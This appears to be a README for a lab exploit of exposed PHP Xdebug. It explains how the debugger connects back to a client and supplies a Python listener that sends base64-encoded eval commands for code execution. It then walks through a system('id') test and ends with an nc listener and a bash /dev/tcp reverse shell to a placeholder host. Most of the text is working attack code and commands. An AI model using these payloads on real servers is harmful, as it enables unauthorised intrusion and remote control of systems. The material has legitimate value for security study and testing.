PHP-XDEBUG
==========

If the xdebug module is enabled it is possible to inject any php code into the running server.
When the parameter `XDEBUG_SESSION=session_name` is set xdebug tries to connect
to `xdebug.client_host` on port `xdebug.client_port`.
The default `client_host` is localhost and the default `client_port` is 9000 for xdebug v2 and
9003 for xdebug v3.

If `xdebug.discover_client_host` is set to true, Xdebug will first try to connect to the
client that made the HTTP request.
It checks the `$_SERVER['HTTP_X_FORWARDED_FOR']` and `$_SERVER['REMOTE_ADDR']` variables
to find out which hostname or IP address to use.
If `xdebug.client_discovery_header` is configured, then the `$_SERVER` variable with that
configured name will be checked before `HTTP_X_FORWARDED_FOR` and `REMOTE_ADDR`.

You can pick any value for `session_name`, unless `xdebug.trigger_value` is set,
in which case the value needs to match the value/one of the values from `xdebug.trigger_value`.

You can start a dummy "xdebug client" 

```python
import socket
import base64

sock = socket.socket()
sock.bind(('0.0.0.0', 9003))
sock.listen()
conn,_ = sock.accept()
init_data = conn.recv(1024)
print(init_data)

while  True:
    command = input('>> ')
    b64 = base64.b64encode(bytes(command, "utf-8"))
    conn.sendall(f"eval -i 0 -- {b64.decode('utf-8')}\x00".encode())

    data = conn.recv(1024)
    print(data)
```

or use one of the [Browser extensions](https://xdebug.org/docs/step_debug#browser-extensions)

and send the eval command to execute php code.

```php
system("id")
```

the command and response are base64 encoded.


## Example

Start webserver
```sh
docker-compose up
```
this will bind the apache to your local port 8080.


Start the listener:
```sh
python exploit.py
```

connect to the server with the xdebug parameter set:
```sh
curl localhost:8080?XDEBUG_SESSION=some_session_name
```

within the pseudo xdebug shell enter:
```php
system("id")
```
and you will get the output of the id command in base64 encoded.

Now you can spin off a reverse shell!

Start listener
```sh
nc -nvlp 4444
```

and start the reverse shell within the "xdebug client"
```php
system("bash -c 'bash -i >&/dev/tcp/<lhost>/4444 0>&1'")
```
